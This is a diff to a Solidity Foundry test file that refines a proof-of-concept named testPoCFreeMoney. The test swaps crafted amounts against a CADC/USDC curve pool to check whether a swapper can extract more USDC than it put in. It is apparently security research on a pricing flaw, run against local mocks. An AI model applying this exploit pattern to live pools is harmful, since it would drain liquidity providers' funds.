@@ -6,6 +6,7 @@ import "forge-std/Test.sol";
 import "../src/AssimilatorFactory.sol";
 import "../src/CurveFactoryV2.sol";
 import "../src/Curve.sol";
+import "../src/Router.sol";
 import "../src/interfaces/IERC20Detailed.sol";
 
 import "./lib/MockUser.sol";
@@ -41,6 +42,8 @@ contract CurveFactoryV2Test is Test {
 
     int128 public protocolFee = 50;
 
+    Router router;
+
     function setUp() public {
         treasury = new MockUser();
         newTreasury = new MockUser();
@@ -53,6 +56,8 @@ contract CurveFactoryV2Test is Test {
             address(treasury),
             address(assimilatorFactory)
         );
+
+        router = new Router(address(curveFactory));
 
         // deploy mock oracle factory for deployed token (named gold)
         oracleFactory = new MockOracleFactory();
@@ -301,9 +306,12 @@ contract CurveFactoryV2Test is Test {
 
     function testPoCFreeMoney() public { 
         // set this for no fuzzing 
+        // CADC is worth 1.9 USDC right here
         uint256 price = 191427874;
-        uint256 amounts = 249741435547872736176;
-        // uint256 amounts = 249741435547872736176450;
+        // this is like 500k of USDC (249k * 1.9)
+        uint256 router_amounts = 495e6;
+        // uint256 amounts = 249741_435_547_872_736_176_450;
+        uint256 amounts = 250_000e18;
         
         // cheats.assume(price > 10 ** 8);
         // cheats.assume(price < 4 * 10 ** 8);
@@ -320,26 +328,41 @@ contract CurveFactoryV2Test is Test {
         usdc.approve(address(dfxCadcCurve), type(uint256).max);
         
         // the LP provides $2M worth of LP
-        dfxCadcCurve.deposit(2000000e18, block.timestamp + 60);
-        emit log_named_uint("Curve CADC amount", cadc.balanceOf(address(dfxCadcCurve))); 
-        emit log_named_uint("Curve USDC amount", usdc.balanceOf(address(dfxCadcCurve))); 
+        dfxCadcCurve.deposit(2_000_000e18, block.timestamp + 60);
+        emit log_named_uint("Curve CADC amount before", cadc.balanceOf(address(dfxCadcCurve)) / 1e18); 
+        emit log_named_uint("Curve USDC amount before", usdc.balanceOf(address(dfxCadcCurve)) / 1e6); 
         cheats.stopPrank();
         
         cheats.startPrank(address(swapper));
         deal(address(usdc), address(swapper), 1_500_000e6);
+        deal(address(cadc), address(swapper), 1_500_000e18);
+        emit log_named_uint("CADC balance of swapper before", cadc.balanceOf(address(swapper)) / 1e18); 
+        emit log_named_uint("USDC balance of swapper before", usdc.balanceOf(address(swapper)) / 1e6);
+        
         // deal(address(cadc), address(swapper), 1_500_000e18);
         cadc.approve(address(dfxCadcCurve), type(uint256).max);
         usdc.approve(address(dfxCadcCurve), type(uint256).max);
-        uint256 amountReal = dfxCadcCurve.targetSwap(address(usdc), address(cadc), type(uint256).max, amounts, block.timestamp + 60);
-        console.log(amountReal);
-        uint256 amountRecv = dfxCadcCurve.originSwap(address(cadc), address(usdc), cadc.balanceOf(address(swapper)), 0, block.timestamp + 60);
-        console.log(amountRecv);
+
+        cadc.approve(address(router), type(uint256).max);
+        usdc.approve(address(router), type(uint256).max);
+
+        console.log("Combined Value Before", (cadc.balanceOf(address(dfxCadcCurve)) / 1e18 * price / 1e8) +  (usdc.balanceOf(address(dfxCadcCurve)) / 1e6));
+
+        // try using a router to see the difference 
+        // router.originSwap(address(usdc), address(usdc), address(cadc), router_amounts, 0, block.timestamp + 60);
+        // router.originSwap(address(usdc), address(cadc), address(usdc), cadc.balanceOf(address(swapper)), 0, block.timestamp + 60);
+        
+        uint256 amountReal = dfxCadcCurve.targetSwap(address(usdc), address(cadc), type(uint256).max, router_amounts, block.timestamp + 60);
+        // uint256 amountRecv = dfxCadcCurve.originSwap(address(cadc), address(usdc), cadc.balanceOf(address(swapper)), 0, block.timestamp + 60);
         cheats.stopPrank();
         
-        emit log_named_uint("USDC balance of swapper",
-        usdc.balanceOf(address(swapper)));
-        emit log_named_uint("Curve CADC amount", cadc.balanceOf(address(dfxCadcCurve)));
-        emit log_named_uint("Curve USDC amount", usdc.balanceOf(address(dfxCadcCurve)));
+        emit log_named_uint("CADC balance of swapper after", cadc.balanceOf(address(swapper)) / 1e18);
+        emit log_named_uint("USDC balance of swapper after", usdc.balanceOf(address(swapper)) / 1e6);
+        
+        emit log_named_uint("Curve CADC amount after", cadc.balanceOf(address(dfxCadcCurve)) / 1e18);
+        emit log_named_uint("Curve USDC amount after", usdc.balanceOf(address(dfxCadcCurve)) / 1e6);
+
+        console.log("Combined Value After", (cadc.balanceOf(address(dfxCadcCurve)) / 1e18 * price / 1e8) +  (usdc.balanceOf(address(dfxCadcCurve)) / 1e6));
         
         require(usdc.balanceOf(address(swapper)) >= 1510000e6, "free money!!");
     }
